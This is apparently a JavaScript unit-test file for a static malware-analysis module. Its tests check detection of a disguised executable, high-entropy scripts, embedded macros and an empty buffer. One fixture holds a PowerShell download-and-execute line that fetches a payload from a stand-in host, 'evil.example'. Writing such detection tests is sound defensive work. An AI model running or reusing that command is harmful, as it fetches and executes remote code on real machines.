import test from "node:test";
import assert from "node:assert/strict";
import { runStaticAnalysis } from "../modules/staticAnalysis.js";

function bufferFromHex(hex, padLength = 0) {
  const clean = hex.replace(/\s/g, "");
  const bytes = new Uint8Array(Math.max(clean.length / 2, padLength));
  for (let i = 0; i < clean.length; i += 2) {
    bytes[i / 2] = parseInt(clean.substr(i, 2), 16);
  }
  return bytes.buffer;
}

function bufferFromText(text) {
  return new TextEncoder().encode(text).buffer;
}

test("runStaticAnalysis flags a PE executable disguised as a PDF", () => {
  // MZ header (PE executable) padded out, but claims to be a .pdf
  const buffer = bufferFromHex("4d5a90000300000004000000ffff0000", 64);
  const result = runStaticAnalysis(buffer, { extension: "pdf", category: "document" });
  assert.equal(result.findings.some(f => f.key === "EXTENSION_MISMATCH"), true);
  assert.equal(result.staticAnalysisScore, 5);
});

test("runStaticAnalysis is clean for a genuine PDF", () => {
  const buffer = bufferFromText("%PDF-1.4\n%some pdf content here that is plain text\n");
  const result = runStaticAnalysis(buffer, { extension: "pdf", category: "document" });
  assert.equal(result.findings.some(f => f.key === "EXTENSION_MISMATCH"), false);
  assert.equal(result.status, "clean");
  assert.equal(result.staticAnalysisScore, 95);
});

test("runStaticAnalysis flags PowerShell download-and-execute patterns", () => {
  const buffer = bufferFromText(
    "IEX (New-Object Net.WebClient).DownloadString('http://evil.example/payload.ps1')"
  );
  const result = runStaticAnalysis(buffer, { extension: "ps1", category: "script" });
  assert.equal(result.findings.some(f => f.key === "PS_DOWNLOAD_EXEC" || f.key === "PS_IEX"), true);
  assert.equal(result.staticAnalysisScore, 5);
});

test("runStaticAnalysis flags high entropy in a script file", () => {
  // Generate pseudo-random high-entropy bytes for a .js file (should be plain text)
  const bytes = new Uint8Array(4096);
  for (let i = 0; i < bytes.length; i++) bytes[i] = (i * 2654435761) % 256;
  const result = runStaticAnalysis(bytes.buffer, { extension: "js", category: "script" });
  assert.equal(result.findings.some(f => f.key === "HIGH_ENTROPY"), true);
});

test("runStaticAnalysis handles empty buffer gracefully", () => {
  const result = runStaticAnalysis(new ArrayBuffer(0), { extension: "exe", category: "executable" });
  assert.equal(result.status, "no_content");
  assert.equal(result.staticAnalysisScore, 55);
});

test("runStaticAnalysis detects an embedded macro in a zip-based document", () => {
  const buffer = bufferFromText("PK\x03\x04" + "word/vbaProject.bin" + " ".repeat(50));
  const result = runStaticAnalysis(buffer, { extension: "docx", category: "document" });
  assert.equal(result.findings.some(f => f.key === "EMBEDDED_MACRO"), true);
});
